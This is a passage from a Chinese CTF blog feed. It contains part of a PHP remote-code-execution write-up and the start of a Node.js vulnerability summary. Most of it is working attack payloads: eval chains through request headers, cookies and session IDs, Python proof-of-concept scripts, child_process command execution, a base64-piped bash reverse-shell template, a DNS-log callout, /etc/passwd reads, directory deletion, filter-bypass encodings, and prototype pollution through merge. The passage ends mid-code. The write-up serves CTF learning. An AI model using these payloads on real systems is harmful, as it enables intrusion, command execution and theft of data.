//chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于&quot;.&quot;所以使用chr(time())，一个周期必定出现一次&quot;.&quot; 我爆破了1w次，雀氏有可行性哈哈，不过雀氏有点小离谱var_dump(scandir(chr(ord(hebrevc(crypt(time())))))); //hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 &quot;.&quot;(小概率) 然后通过chr(ord())只取第一个字符var_dump(scandir(chr(ord(strrev(crypt(serialize(array())))))));  if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd())); //设置当前工作路径为根目录，然后遍历此目录</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175238708.png" alt="  "></p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175828251.png" alt="image-20221122175828251"></p><p>如何进行目录上跳呢？我们用<code>dirname()</code>即可</p><pre><code class="php">var_dump(scandir(dirname(getcwd())));</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174205898.png" alt="image-20221122174205898"></p><p>那么怎么更改我们的当前目录呢？使用<code>chdir</code></p><pre><code>chdir(dirname(getcwd()));  //将当前目录设置为上一级目录</code></pre><p>搭配chadir来读取文件:</p><pre><code class="php">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><p>再给出其它一些读取文件的操作:</p><pre><code class="php">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));以上两个都是随机获取的其实，看脸,它们的作用都是随机选取一个根目录的文件进行读取</code></pre><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders"></a>getallheaders</h2><p>只适用于apache中间件</p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122143753491.png" alt="image-20221122143753491" style="zoom:67%;"><p>我们来打印出来看看</p><pre><code>http://127.0.0.1/index.php?code=var_dump(getallheaders());</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144238099.png" alt="image-20221122144238099"></p><p>它把我们的header头输出了，但是header头我们是可以自定义的</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144525537.png" alt="image-20221122144525537"></p><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144718307.png" alt="image-20221122144718307"></p><p>我们来使用一下，可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p><pre><code class="php">var_dump(implode(getallheaders()));sakura: flag</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144928146.png" alt="image-20221122144928146"></p><p>来执行命令:</p><pre><code class="php">GET /index.php?code=eval(implode(getallheaders())); HTTP/1.1sakura: system(whoami);//</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122145432187.png" alt="image-20221122145432187"></p><p>事实上这样操作具有局限性，万一我们输出的头不再最开始不就g了?</p><p>但是我们有很多函数可以去帮我们去获得我们想要的字符串</p><p>由于在开头第一个我们还可以使用pos函数去得到我们输入的命令</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150157102.png" alt="image-20221122150157102"></p><p>假如说它的位置不在数组第一个，在最后一个呢?</p><p>我们只需要使用end就可以把它取出来，这里我输入的值位置并不在第一个，所以取出来并没有用，只是做个示范罢了</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150850290.png" alt="image-20221122150850290"></p><p>那么相信大家已经会了，现在我们如何取数组第二个呢?</p><p>相信大家心里已经有了答案，使用next!</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122151030098.png" alt="image-20221122151030098"></p><p>就是这样，搭配不同的函数取出我们想要的值即可</p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效，我们也没有更加普遍的方式呢？这里我们可以使用get_defined_vars()</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122154832676.png" alt="image-20221122154832676"></p><p>该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与<code>implode</code>结合起来用。将<code>get_defined_vars()</code>的结果用<code>var_dump()</code>输出结果如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155240401.png" alt="image-20221122155240401"></p><p>发现其可以回显全局变量:</p><pre><code>$_GET$_POST$_FILES$_COOKIE</code></pre><p>可以看到用GET传入的参数会被显示在数组中的第一位,不过这里有这么多的数组，我们也不需要全部查看,只需要使用<code>current()</code>函数就可以取到我们想要的东西</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155556428.png" alt="image-20221122155556428"></p><p>我们来试一试:</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155713268.png" alt="image-20221122155713268"></p><p>给我们返回了一个一维数组，我们再想办法取得第二个值:</p><pre><code class="php">GET /index.php?code=var_dump(next(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155831177.png" alt="image-20221122155831177"></p><p>然后就可以来执行命令</p><pre><code class="php">GET /index.php?code=eval(next(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161512219.png" alt="image-20221122161512219"></p><p>除了next还可以使用end</p><pre><code class="php">GET /index.php?code=eval(end(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161858843.png" alt="image-20221122161858843"></p><p>但一般网站喜欢对</p><pre><code>$_GET$_POST$_COOKIE</code></pre><p>做全局过滤，所以我们可以尝试从<code>$_FILES</code>下手，这就需要我们自己写一个上传</p><pre><code class="python">import requestsfrom io import BytesIOpayload = &quot;system(&#39;ls /tmp&#39;);&quot;.encode(&#39;hex&#39;)files = &#123;  payload: BytesIO(&#39;sky cool!&#39;)&#125;r = requests.post(&#39;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#39;, files=files, allow_redirects=False)print r.content</code></pre><p>注意:上面这个脚本只适用于$_FILES在最后的情况，要根据条件不用去修改其位置</p><h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h2><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164305081.png" alt="image-20221122164305081"></p><p>官方说：<code>session_id()</code>可以用来获取/设置当前会话 ID。<br> 那么可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。<br> 但其有限制：</p><p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p><p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164407079.png" alt="image-20221122164407079"></p><p>但session_id必须要开启session才可以使用，所以我们要先使用session_start。</p><p>所以，payload可以为：</p><pre><code class="php">eval(hex2bin(session_id(session_start())));  //hex(&quot;phpinfo();&quot;)=706870696e666f28293b</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164738128.png" alt="image-20221122164738128"></p><p>顺便给出一个poc:</p><pre><code class="python">import requestsurl = &#39;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#39;payload = &quot;echo &#39;sky cool&#39;;&quot;.encode(&#39;hex&#39;)cookies = &#123;    &#39;PHPSESSID&#39;:payload&#125;r = requests.get(url=url,cookies=cookies)print r.content</code></pre><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv"></a>getenv</h2><p><strong>只适用于php7.1以后版本</strong></p><p>通过array_rand()和array_flip()结合去取我们想要的那个值，但是一般情况下php.ini中，variables_order值为：GPCS，即没有定义Environment(E)变量，无法利用。只有当其配置为EGPCS时才可利用。</p><p>查阅php手册，有非常多的超全局变量</p><pre><code class="php">$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV</code></pre><p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122165153813.png" alt="image-20221122165153813"></p><p>我们来打印一下吧:</p><pre><code class="php">GET /index.php?code=var_dump(getenv()); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170631213.png" alt="image-20221122170631213"></p><p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/2019-03-29-13-47-19.png" alt="img"></p><p>我们来试一下:</p><pre><code class="php">GET /index.php?code=var_dump(array_rand(getenv())); </code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170911592.png" alt="image-20221122170911592"></p><p>但是我们不想要下标，我们想要下标的值，该怎么办呢?</p><pre><code class="php">GET /index.php?code=var_dump(array_rand(array_flip(getenv()))); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122171114135.png" alt="image-20221122171114135"></p><p>我们这么写达到了什么效果呢?—&gt;随机获取一个环境变量的值</p><p>我们则可用爆破的方式获取数组中任意位置需要的值，那么即可使用getenv()，并获取指定位置的恶意参数</p><p>说实话我个人对这种做法还是比较懵逼，我并没有找到好的方法去执行命令，我观看了网上的文章都是到这一步就停下了，唯一达到的效果就是执行了phpinfo()?其实也不必要这么麻烦的</p><pre><code class="php">POST /index.php?code=var_dump(getenv(phpinfo())); HTTP/1.1</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">https://blog.csdn.net/Manuffer/article/details/120738755</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs漏洞总结</title>
      <link href="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Nodejs语言特性"><a href="#Nodejs语言特性" class="headerlink" title="Nodejs语言特性"></a>Nodejs语言特性</h1><h2 id="大小写特性"><a href="#大小写特性" class="headerlink" title="大小写特性"></a>大小写特性</h2><pre><code class="plsql">toUpperCase()toLowerCase()</code></pre><p> 对于toUpperCase(): 字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”<br>对于toLowerCase(): 字符”K”经过toLowerCase处理后结果为”k”(这个K不是K)  </p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><h3 id="大小比较"><a href="#大小比较" class="headerlink" title="大小比较"></a>大小比较</h3><pre><code class="plsql">console.log(1==&#39;1&#39;); //true console.log(1&gt;&#39;2&#39;); //false console.log(&#39;1&#39;&lt;&#39;2&#39;); //true console.log(111&gt;&#39;3&#39;); //true console.log(&#39;111&#39;&gt;&#39;3&#39;); //false console.log(&#39;asd&#39;&gt;1); //false</code></pre><p> 总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false  </p><h3 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h3><pre><code class="plsql">console.log([]==[]); //false console.log([]&gt;[]); //falseconsole.log([6,2]&gt;[5]); //true console.log([100,2]&lt;&#39;test&#39;); //true console.log([1,2]&lt;&#39;2&#39;);  //true console.log([11,16]&lt;&quot;10&quot;); //false</code></pre><p> 总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较  </p><h3 id="还有一些比较特别的相等："><a href="#还有一些比较特别的相等：" class="headerlink" title="还有一些比较特别的相等："></a>还有一些比较特别的相等：</h3><pre><code class="plsql">console.log(null==undefined) // 输出：true console.log(null===undefined) // 输出：false console.log(NaN==NaN)  // 输出：false console.log(NaN===NaN)  // 输出：false</code></pre><h2 id="变量拼接："><a href="#变量拼接：" class="headerlink" title="变量拼接："></a>变量拼接：</h2><pre><code class="plsql">console.log(5+[6,6]); //56,6console.log(&quot;5&quot;+6); //56 console.log(&quot;5&quot;+[6,6]); //56,6 console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6</code></pre><h2 id="MD5的绕过"><a href="#MD5的绕过" class="headerlink" title="MD5的绕过"></a>MD5的绕过</h2><pre><code class="plsql">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)</code></pre><p>a[x]=1&amp;b[x]=2<br>数组会被解析成**[object Object]      **</p><pre><code class="plsql">a=&#123;&#39;x&#39;:&#39;1&#39;&#125;b=&#123;&#39;x&#39;:&#39;2&#39;&#125; console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;) a=[1]b=[2] console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1667810117885-97fe09ad-6c49-4819-8356-cf5c04b9446c.png" alt="2f6f612f38094b2ab52b16106b4cdaff.png"></p><h2 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a>ES6模板字符串</h2><p>我们可以使用反引号替代括号执行函数，可以用反引号替代单引号双引号，可以在反引号内插入变量。<br>但是有一点我们需要注意，模板字符串是将字符串作为参数传入函数中，而参数是一个数组，所以数组遇到${}时，字符串会被分割。</p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log(&quot;hello %s&quot;,yake);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783362313-8f198fb4-93cd-4572-8a3e-a256390cb13e.png" alt="image.png"></p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log`hello$&#123;yake&#125;world`;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783434923-1fa642fb-e307-494e-8fbb-625f8f325521.png" alt="image.png"></p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h3><pre><code class="plsql">console.log(&quot;a&quot;===&quot;\x61&quot;); // true</code></pre><h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><pre><code class="plsql">console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</code></pre><h3 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h3><pre><code class="plsql">eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())</code></pre><h1 id="Nodejs危险函数的利用"><a href="#Nodejs危险函数的利用" class="headerlink" title="Nodejs危险函数的利用"></a>Nodejs危险函数的利用</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p> javascript 的 eval 作用就是计算某个字符串，并执行其中的 js 代码。  </p><pre><code class="plsql">console.log(eval(&quot;document.cookie&quot;)); //执行document.cookieconsole.log(&quot;document.cookie&quot;); //输出document.cookie</code></pre><p><strong>我们来搭建一个服务测试一下</strong></p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/&#39;,function(req,res)&#123;    res.send(eval(req.query.a));console.log(req.query.a);&#125;)app.listen(1234);console.log(&#39;Server runing at http://127.0.0.1:1234/&#39;);</code></pre><p> Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令<br><strong>1.exec()</strong><br> 启动一个子进程来执行命令，与spawn()不同的是其接口不同，它有一个回调函数获知子进程的状况。实际使用可以不加回调函数。  </p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><pre><code class="plsql">http://127.0.0.1:1234/?a=require(&#39;child_process&#39;).exec(&#39;ping 8ogywq.dnslog.cn&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784913491-37d4aa9c-2ac5-4002-907b-85b127ba50f2.png" alt="image.png"><br>我们可以看到成功执行了命令<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784938711-2a5fe36d-fc0c-4e43-8237-6446a8cc5fa9.png" alt="image.png"><br><strong>我们可以进行反弹shell的操作:</strong></p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</code></pre><p>PS：如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，<br>则可以使用global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)来执行命令</p><p><strong>2.spawn()</strong><br> 启动一个子进程来执行命令。spawn (命令，{shell:true})。需要开启命令执行的指令。  </p><pre><code class="plsql">require(&#39;child_process&#39;).spawn(&#39;whoami&#39;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668785909690-1fbe2c21-44f1-46e5-b078-762a11e53787.png" alt="image.png"><br><strong>3.fork()</strong><br> 与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。用于执行 js 文件，实际利用中需要提前写入恶意文件  </p><pre><code class="plsql">require(&#39;child_process&#39;).fork(&#39;C:\\Users\\Sakura\\Desktop\\evil.js&#39;);</code></pre><p>此时是假设我们已经上传了evil.js文化,我们就可以用fork去执行<br>如我们在evil.js中代码如下:</p><pre><code class="plsql">console.log(&quot;hello hacker&quot;);</code></pre><p>我们此时访问这个网站</p><pre><code class="plsql">http://127.0.0.1:1234/?a=require(%27child_process%27).fork(%27C:\\Users\\Sakura\\Desktop\\evil.js%27);</code></pre><p>如图，命令被成功执行了<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668788483287-4013c99b-b180-45fe-99cc-a06226ef1751.png" alt="image.png"><br><strong>4.execFile()</strong><br> 启动一个子进程来执行可执行文件。实际利用时，在第一个参数位置执行 shell 命令，类似 exec。  </p><pre><code class="plsql">require(&#39;child_process&#39;).execFile(&quot;calc&quot;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668789182418-b79fe64a-ed03-4594-abe0-0ad2e03fa454.png" alt="image.png"><br><strong>注意点:</strong></p><ol><li>**<em>spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性</em>**，设置超时时间， 一旦创建的进程运行超过设定的时间将会被杀死。</li><li>exec()与execFile()不同的是，**<em>exec()适合执行已有的命令，execFile()适合执行文件</em>**。</li></ol><p><strong>后面几个函数的利用方法也是调用上述介绍的四种方法,这里就不再赘述!</strong></p><h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p> settimeout(function,time)，该函数作用是两秒后执行函数，function 处为我们可控的参数。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setTimeout(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p> setinterval (function,time)，该函数的作用是每个两秒执行一次代码。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setInterval(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="function"><a href="#function" class="headerlink" title="function()"></a>function()</h3><p> function(string)()，string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();var aaa=Function(&quot;console.log(&#39;Hacked&#39;)&quot;)();var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>既然我们可以执行函数，那自然可以进行文件的增删改查。<br>操作函数后面有Sync代表同步方法</p><blockquote><p>Node.js 文件系统（fs 模块）模块中的方法均有异步和同步版本，例如读取文件内容的函数有异步的 fs.readFile() 和同步的 fs.readFileSync()。<br>异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息(error)。<br>建议大家使用异步方法，比起同步，异步方法性能更高，速度更快，而且没有阻塞。</p></blockquote><p><strong>读</strong><br>readFile()</p><pre><code class="plsql">require(&#39;fs&#39;).readFile(&#39;/etc/passwd&#39;, &#39;utf-8&#39;, (err, data) =&gt; &#123; if (err) throw err; console.log(data);&#125;);</code></pre><p> readFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;)</code></pre><p>readdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString()</code></pre><p>rmdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString()</code></pre><p><strong>写</strong><br> writeFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFileSync(&#39;input.txt&#39;,&#39;sss&#39;);</code></pre><p> writeFile()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFile(&#39;input.txt&#39;,&#39;test&#39;,(err)=&gt;&#123;&#125;)</code></pre><h2 id="nodejs危险函数-RCE-bypass"><a href="#nodejs危险函数-RCE-bypass" class="headerlink" title="nodejs危险函数-RCE bypass"></a>nodejs危险函数-RCE bypass</h2><p> 原型:</p><pre><code class="plsql">require(&quot;child_process&quot;).execSync(&#39;cat flag.txt&#39;)</code></pre><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)//(%2b就是+的url编码) require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)</code></pre><h3 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#39;cat fl001g.txt&#39;)eval(Buffer.from(&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#39;,&#39;base64&#39;).toString()) //弹计算器</code></pre><h3 id="模板拼接"><a href="#模板拼接" class="headerlink" title="模板拼接"></a>模板拼接</h3><pre><code class="plsql">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#39;open /System/Applications/Calculator.app/&#39;）</code></pre><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><pre><code class="plsql">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//调用某个可执行文件，在第二个参数传args* require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);</code></pre><h1 id="nodejs-原型链污染"><a href="#nodejs-原型链污染" class="headerlink" title="nodejs-原型链污染"></a>nodejs-原型链污染</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们首先要知道这几点:<br> 1.在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。  </p><pre><code class="plsql">object.prototype.name=value</code></pre><p> 2.在javascript，每一个实例对象都有一个__proto__属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：  </p><pre><code class="html">objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p> 3.不同对象所生成的原型链如下(部分)：  </p><pre><code class="html">var o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><p>知道了以上三点以后，我们来介绍如何进行原型链污染</p><p> 对于语句：object[a][b] = value 如果可以控制a、b、value的值，将a设置为__proto__，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。<br> 来看一个简单的例子:  </p><pre><code class="html">object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668790669590-6b7771d7-3023-46f0-bb45-2ddec0c9e219.png" alt="image.png"><br>最终输出了两个hello word<br>为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了 一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p><h2 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h2><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。<br>例子:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;    if (key in source &amp;&amp; key in target) &#123;        merge(target[key], source[key])    &#125; else &#123;        target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: 